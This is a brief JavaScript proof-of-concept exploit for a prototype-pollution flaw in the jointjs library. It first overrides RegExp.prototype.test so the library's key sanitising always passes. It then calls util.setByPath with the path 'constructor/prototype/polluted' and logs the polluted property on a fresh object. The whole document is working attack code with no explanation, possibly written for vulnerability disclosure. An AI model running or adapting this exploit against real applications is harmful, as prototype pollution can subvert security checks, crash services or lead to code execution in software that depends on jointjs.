RegExp.prototype.test = () => true;
console.log({}.polluted);
const jointjs = require('jointjs');
jointjs.util.setByPath({}, 'constructor/prototype/polluted', 'yes', '/');
console.log({}.polluted);